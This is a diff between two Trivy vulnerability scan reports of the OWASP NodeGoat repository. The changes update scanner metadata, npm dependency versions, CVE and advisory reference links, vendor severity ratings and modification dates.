@@ -1,12 +1,12 @@
 {
   "SchemaVersion": 2,
   "Trivy": {
-    "Version": "0.69.1"
+    "Version": "0.70.0"
   },
-  "ReportID": "019dce53-7253-7b8b-adbd-f6e8afcdf42c",
-  "CreatedAt": "2026-04-27T14:44:28.4997586+05:00",
+  "ReportID": "019e8d7b-b4c4-7ac3-835b-398c72e4e1aa",
+  "CreatedAt": "2026-06-03T12:35:55.204708791Z",
   "ArtifactID": "sha256:c18d564916d77203ac5d5202e66a788976158d6a5e0eb9acc7cdb6ab8defd8c9",
-  "ArtifactName": "/home/muhmmad-abdullah/.cache/darkpulse/trivy_repos/repo_trivy__bs7qozk",
+  "ArtifactName": "/home/darkpulse/.cache/darkpulse/trivy_repos/repo_trivy_ekuxig66",
   "ArtifactType": "repository",
   "Metadata": {
     "RepoURL": "https://github.com/OWASP/NodeGoat.git",
@@ -6512,7 +6512,7 @@
           "Name": "dezalgo",
           "Identifier": {
             "PURL": "pkg:npm/dezalgo@1.0.3",
-            "UID": "f76b8d4b12551584"
+            "UID": "a01759f3f7fe9d9c"
           },
           "Version": "1.0.3",
           "Dev": true,
@@ -6522,7 +6522,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "asap@2.0.5",
+            "asap@2.0.6",
             "wrappy@1.0.2"
           ],
           "Locations": [
@@ -10186,7 +10186,7 @@
           "Name": "has-ansi",
           "Identifier": {
             "PURL": "pkg:npm/has-ansi@2.0.0",
-            "UID": "20eb47b374b7bb62"
+            "UID": "1b94a1be6f3b281d"
           },
           "Version": "2.0.0",
           "Dev": true,
@@ -10196,7 +10196,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "ansi-regex@2.1.1"
+            "ansi-regex@2.0.0"
           ],
           "Locations": [
             {
@@ -12023,7 +12023,7 @@
           "Name": "is-fullwidth-code-point",
           "Identifier": {
             "PURL": "pkg:npm/is-fullwidth-code-point@1.0.0",
-            "UID": "3e3ddc05169245df"
+            "UID": "9619f5eb5eca5488"
           },
           "Version": "1.0.0",
           "Licenses": [
@@ -12032,7 +12032,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "number-is-nan@1.0.0"
+            "number-is-nan@1.0.1"
           ],
           "Locations": [
             {
@@ -16372,7 +16372,7 @@
           "Name": "nopt",
           "Identifier": {
             "PURL": "pkg:npm/nopt@3.0.6",
-            "UID": "7ef4112423b5344a"
+            "UID": "12ad2d2f7212984"
           },
           "Version": "3.0.6",
           "Dev": true,
@@ -16382,7 +16382,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "abbrev@1.0.9"
+            "abbrev@1.1.1"
           ],
           "Locations": [
             {
@@ -17670,7 +17670,7 @@
           "Name": "optimist",
           "Identifier": {
             "PURL": "pkg:npm/optimist@0.6.1",
-            "UID": "14caa949b43933"
+            "UID": "d8dd41366908db49"
           },
           "Version": "0.6.1",
           "Licenses": [
@@ -17679,7 +17679,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "minimist@0.0.10",
+            "minimist@0.0.8",
             "wordwrap@0.0.3"
           ],
           "Locations": [
@@ -18447,7 +18447,7 @@
           "Name": "path-type",
           "Identifier": {
             "PURL": "pkg:npm/path-type@1.1.0",
-            "UID": "ec76c566cefc9378"
+            "UID": "13f6419f785a639e"
           },
           "Version": "1.1.0",
           "Dev": true,
@@ -18457,7 +18457,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "graceful-fs@4.1.4",
+            "graceful-fs@4.1.15",
             "pify@2.3.0",
             "pinkie-promise@2.0.1"
           ],
@@ -19434,7 +19434,7 @@
           "Name": "read",
           "Identifier": {
             "PURL": "pkg:npm/read@1.0.7",
-            "UID": "5760dca2cf6f5e0a"
+            "UID": "a07ded05880af35b"
           },
           "Version": "1.0.7",
           "Licenses": [
@@ -19443,7 +19443,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "mute-stream@0.0.8"
+            "mute-stream@0.0.5"
           ],
           "Locations": [
             {
@@ -19487,7 +19487,7 @@
           "Name": "read-installed",
           "Identifier": {
             "PURL": "pkg:npm/read-installed@4.0.3",
-            "UID": "6f017c7584fa7376"
+            "UID": "5339a6034636ecbc"
           },
           "Version": "4.0.3",
           "Dev": true,
@@ -19498,10 +19498,10 @@
           "Relationship": "indirect",
           "DependsOn": [
             "debuglog@1.0.1",
-            "graceful-fs@4.1.9",
-            "read-package-json@2.0.4",
+            "graceful-fs@4.1.15",
+            "read-package-json@2.0.13",
             "readdir-scoped-modules@1.0.2",
-            "semver@5.3.0",
+            "semver@5.6.0",
             "slide@1.1.6",
             "util-extend@1.0.3"
           ],
@@ -19605,7 +19605,7 @@
           "Name": "read-pkg",
           "Identifier": {
             "PURL": "pkg:npm/read-pkg@1.1.0",
-            "UID": "fc3640b0b0bf05d9"
+            "UID": "20babb9cb9553be2"
           },
           "Version": "1.1.0",
           "Dev": true,
@@ -19616,7 +19616,7 @@
           "Relationship": "indirect",
           "DependsOn": [
             "load-json-file@1.1.0",
-            "normalize-package-data@2.4.0",
+            "normalize-package-data@2.3.5",
             "path-type@1.1.0"
           ],
           "Locations": [
@@ -19821,7 +19821,7 @@
           "Name": "readdir-scoped-modules",
           "Identifier": {
             "PURL": "pkg:npm/readdir-scoped-modules@1.0.2",
-            "UID": "ec5e8079e3243dcc"
+            "UID": "7541708885691838"
           },
           "Version": "1.0.2",
           "Dev": true,
@@ -19833,7 +19833,7 @@
           "DependsOn": [
             "debuglog@1.0.1",
             "dezalgo@1.0.3",
-            "graceful-fs@4.1.15",
+            "graceful-fs@4.1.9",
             "once@1.4.0"
           ],
           "Locations": [
@@ -20779,7 +20779,7 @@
           "Name": "rimraf",
           "Identifier": {
             "PURL": "pkg:npm/rimraf@2.5.4",
-            "UID": "b9e70b9c4fb27579"
+            "UID": "77871a754b21a5f4"
           },
           "Version": "2.5.4",
           "Dev": true,
@@ -20789,7 +20789,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "glob@7.0.5"
+            "glob@7.1.0"
           ],
           "Locations": [
             {
@@ -22014,7 +22014,7 @@
           "Name": "spdx-correct",
           "Identifier": {
             "PURL": "pkg:npm/spdx-correct@1.0.2",
-            "UID": "7a5653e19157de7c"
+            "UID": "f5c1ef2193baa66b"
           },
           "Version": "1.0.2",
           "Dev": true,
@@ -22024,7 +22024,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "spdx-license-ids@1.2.0"
+            "spdx-license-ids@1.2.1"
           ],
           "Locations": [
             {
@@ -22129,7 +22129,7 @@
           "Name": "spdx-expression-parse",
           "Identifier": {
             "PURL": "pkg:npm/spdx-expression-parse@1.0.2",
-            "UID": "854c5b88267d780d"
+            "UID": "e9a6c1bb932eceda"
           },
           "Version": "1.0.2",
           "Dev": true,
@@ -22139,8 +22139,8 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "spdx-exceptions@1.0.5",
-            "spdx-license-ids@1.2.1"
+            "spdx-exceptions@1.0.4",
+            "spdx-license-ids@1.2.0"
           ],
           "Locations": [
             {
@@ -22580,7 +22580,7 @@
           "Name": "string-width",
           "Identifier": {
             "PURL": "pkg:npm/string-width@1.0.2",
-            "UID": "f61f8aca51136f3c"
+            "UID": "18ee1ce18417b831"
           },
           "Version": "1.0.2",
           "Licenses": [
@@ -22589,7 +22589,7 @@
           "Indirect": true,
           "Relationship": "indirect",
           "DependsOn": [
-            "code-point-at@1.0.0",
+            "code-point-at@1.1.0",
             "is-fullwidth-code-point@1.0.0",
             "strip-ansi@3.0.1"
           ],
@@ -26363,30 +26363,21 @@
             "https://bugzilla.redhat.com/2105426",
             "https://bugzilla.redhat.com/2105428",
             "https://bugzilla.redhat.com/2105430",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=1945459",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=1964461",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2007557",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2098556",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2102001",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105422",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105426",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105428",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105430",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2121019",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2124299",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28469",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7788",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33502",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2106369",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3807",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29244",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32213",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32214",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32215",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-33987",
             "https://errata.almalinux.org/9/ALSA-2022-6595.html",
-            "https://errata.rockylinux.org/RLSA-2022:6595",
+            "https://errata.rockylinux.org/RLSA-2022:6449",
             "https://github.com/chalk/ansi-regex",
             "https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1",
             "https://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a",
@@ -28447,30 +28438,21 @@
             "https://bugzilla.redhat.com/2105426",
             "https://bugzilla.redhat.com/2105428",
             "https://bugzilla.redhat.com/2105430",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=1945459",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=1964461",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2007557",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2098556",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2102001",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105422",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105426",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105428",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2105430",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2121019",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2124299",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28469",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7788",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33502",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2106369",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3807",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29244",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32213",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32214",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32215",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-33987",
             "https://errata.almalinux.org/9/ALSA-2022-6595.html",
-            "https://errata.rockylinux.org/RLSA-2022:6595",
+            "https://errata.rockylinux.org/RLSA-2022:6449",
             "https://github.com/sindresorhus/got",
             "https://github.com/sindresorhus/got/commit/861ccd9ac2237df762a9e2beed7edd88c60782dc",
             "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
@@ -29735,7 +29717,7 @@
             "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
           ],
           "PublishedDate": "2016-04-13T16:59:13.473Z",
-          "LastModifiedDate": "2025-04-12T10:46:40.837Z"
+          "LastModifiedDate": "2026-05-06T22:30:45.22Z"
         },
         {
           "VulnerabilityID": "CVE-2022-29167",
@@ -30244,27 +30226,23 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1945459",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1964461",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1999731",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1999739",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2007557",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2098556",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2102001",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105422",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105426",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105428",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105430",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2121019",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2124299",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2014057",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2014059",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2024702",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28469",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7788",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22959",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22960",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33502",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37701",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37712",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3807",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29244",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32213",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32214",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32215",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-33987",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3918",
             "https://errata.almalinux.org/9/ALSA-2022-6595.html",
-            "https://errata.rockylinux.org/RLSA-2022:6595",
+            "https://errata.rockylinux.org/RLSA-2022:0350",
             "https://github.com/npm/ini",
             "https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1",
             "https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1 (v1.3.6)",
@@ -30348,27 +30326,23 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1945459",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1964461",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1999731",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1999739",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2007557",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2098556",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2102001",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105422",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105426",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105428",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2105430",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2121019",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2124299",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2014057",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2014059",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2024702",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28469",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7788",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22959",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22960",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33502",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37701",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37712",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3807",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29244",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32213",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32214",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32215",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-33987",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3918",
             "https://errata.almalinux.org/9/ALSA-2022-6595.html",
-            "https://errata.rockylinux.org/RLSA-2022:6595",
+            "https://errata.rockylinux.org/RLSA-2022:0350",
             "https://github.com/npm/ini",
             "https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1",
             "https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1 (v1.3.6)",
@@ -31571,8 +31545,10 @@
             "CWE-94"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 3,
             "nvd": 4,
+            "oracle-oval": 3,
             "redhat": 3
           },
           "CVSS": {
@@ -31590,17 +31566,22 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10710",
             "https://access.redhat.com/security/cve/CVE-2026-4800",
+            "https://bugzilla.redhat.com/2453496",
             "https://cna.openjsf.org/security-advisories.html",
+            "https://errata.almalinux.org/9/ALSA-2026-10710.html",
             "https://github.com/advisories/GHSA-35jh-r3h4-6jhm",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
             "https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc",
+            "https://linux.oracle.com/cve/CVE-2026-4800.html",
+            "https://linux.oracle.com/errata/ELSA-2026-10713.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-4800",
             "https://www.cve.org/CVERecord?id=CVE-2026-4800"
           ],
           "PublishedDate": "2026-03-31T20:16:29.66Z",
-          "LastModifiedDate": "2026-04-07T15:43:13.197Z"
+          "LastModifiedDate": "2026-05-01T18:09:13.047Z"
         },
         {
           "VulnerabilityID": "CVE-2019-1010266",
@@ -31784,7 +31765,8 @@
             "ghsa": 2,
             "nvd": 2,
             "oracle-oval": 3,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -31806,7 +31788,19 @@
             "https://access.redhat.com/errata/RHSA-2026:2452",
             "https://access.redhat.com/security/cve/CVE-2025-13465",
             "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cert-portal.siemens.com/productcert/html/ssa-253495.html",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
             "https://errata.almalinux.org/9/ALSA-2026-2452.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81",
             "https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg",
@@ -31816,7 +31810,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2025-13465"
           ],
           "PublishedDate": "2026-01-21T20:16:05.25Z",
-          "LastModifiedDate": "2026-02-17T17:10:07.52Z"
+          "LastModifiedDate": "2026-06-02T14:16:28.957Z"
         },
         {
           "VulnerabilityID": "CVE-2026-2950",
@@ -32133,8 +32127,10 @@
             "CWE-94"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 3,
             "nvd": 4,
+            "oracle-oval": 3,
             "redhat": 3
           },
           "CVSS": {
@@ -32152,17 +32148,22 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10710",
             "https://access.redhat.com/security/cve/CVE-2026-4800",
+            "https://bugzilla.redhat.com/2453496",
             "https://cna.openjsf.org/security-advisories.html",
+            "https://errata.almalinux.org/9/ALSA-2026-10710.html",
             "https://github.com/advisories/GHSA-35jh-r3h4-6jhm",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
             "https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc",
+            "https://linux.oracle.com/cve/CVE-2026-4800.html",
+            "https://linux.oracle.com/errata/ELSA-2026-10713.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-4800",
             "https://www.cve.org/CVERecord?id=CVE-2026-4800"
           ],
           "PublishedDate": "2026-03-31T20:16:29.66Z",
-          "LastModifiedDate": "2026-04-07T15:43:13.197Z"
+          "LastModifiedDate": "2026-05-01T18:09:13.047Z"
         },
         {
           "VulnerabilityID": "CVE-2020-28500",
@@ -32276,7 +32277,8 @@
             "ghsa": 2,
             "nvd": 2,
             "oracle-oval": 3,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -32298,7 +32300,19 @@
             "https://access.redhat.com/errata/RHSA-2026:2452",
             "https://access.redhat.com/security/cve/CVE-2025-13465",
             "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cert-portal.siemens.com/productcert/html/ssa-253495.html",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
             "https://errata.almalinux.org/9/ALSA-2026-2452.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81",
             "https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg",
@@ -32308,7 +32322,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2025-13465"
           ],
           "PublishedDate": "2026-01-21T20:16:05.25Z",
-          "LastModifiedDate": "2026-02-17T17:10:07.52Z"
+          "LastModifiedDate": "2026-06-02T14:16:28.957Z"
         },
         {
           "VulnerabilityID": "CVE-2026-2950",
@@ -32476,8 +32490,10 @@
             "CWE-94"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 3,
             "nvd": 4,
+            "oracle-oval": 3,
             "redhat": 3
           },
           "CVSS": {
@@ -32495,17 +32511,22 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10710",
             "https://access.redhat.com/security/cve/CVE-2026-4800",
+            "https://bugzilla.redhat.com/2453496",
             "https://cna.openjsf.org/security-advisories.html",
+            "https://errata.almalinux.org/9/ALSA-2026-10710.html",
             "https://github.com/advisories/GHSA-35jh-r3h4-6jhm",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
             "https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc",
+            "https://linux.oracle.com/cve/CVE-2026-4800.html",
+            "https://linux.oracle.com/errata/ELSA-2026-10713.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-4800",
             "https://www.cve.org/CVERecord?id=CVE-2026-4800"
           ],
           "PublishedDate": "2026-03-31T20:16:29.66Z",
-          "LastModifiedDate": "2026-04-07T15:43:13.197Z"
+          "LastModifiedDate": "2026-05-01T18:09:13.047Z"
         },
         {
           "VulnerabilityID": "CVE-2020-28500",
@@ -32619,7 +32640,8 @@
             "ghsa": 2,
             "nvd": 2,
             "oracle-oval": 3,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -32641,7 +32663,19 @@
             "https://access.redhat.com/errata/RHSA-2026:2452",
             "https://access.redhat.com/security/cve/CVE-2025-13465",
             "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cert-portal.siemens.com/productcert/html/ssa-253495.html",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
             "https://errata.almalinux.org/9/ALSA-2026-2452.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81",
             "https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg",
@@ -32651,7 +32685,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2025-13465"
           ],
           "PublishedDate": "2026-01-21T20:16:05.25Z",
-          "LastModifiedDate": "2026-02-17T17:10:07.52Z"
+          "LastModifiedDate": "2026-06-02T14:16:28.957Z"
         },
         {
           "VulnerabilityID": "CVE-2026-2950",
@@ -32740,8 +32774,10 @@
             "CWE-94"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 3,
             "nvd": 4,
+            "oracle-oval": 3,
             "redhat": 3
           },
           "CVSS": {
@@ -32759,17 +32795,22 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10710",
             "https://access.redhat.com/security/cve/CVE-2026-4800",
+            "https://bugzilla.redhat.com/2453496",
             "https://cna.openjsf.org/security-advisories.html",
+            "https://errata.almalinux.org/9/ALSA-2026-10710.html",
             "https://github.com/advisories/GHSA-35jh-r3h4-6jhm",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
             "https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc",
+            "https://linux.oracle.com/cve/CVE-2026-4800.html",
+            "https://linux.oracle.com/errata/ELSA-2026-10713.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-4800",
             "https://www.cve.org/CVERecord?id=CVE-2026-4800"
           ],
           "PublishedDate": "2026-03-31T20:16:29.66Z",
-          "LastModifiedDate": "2026-04-07T15:43:13.197Z"
+          "LastModifiedDate": "2026-05-01T18:09:13.047Z"
         },
         {
           "VulnerabilityID": "CVE-2025-13465",
@@ -32804,7 +32845,8 @@
             "ghsa": 2,
             "nvd": 2,
             "oracle-oval": 3,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -32826,7 +32868,19 @@
             "https://access.redhat.com/errata/RHSA-2026:2452",
             "https://access.redhat.com/security/cve/CVE-2025-13465",
             "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cert-portal.siemens.com/productcert/html/ssa-253495.html",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
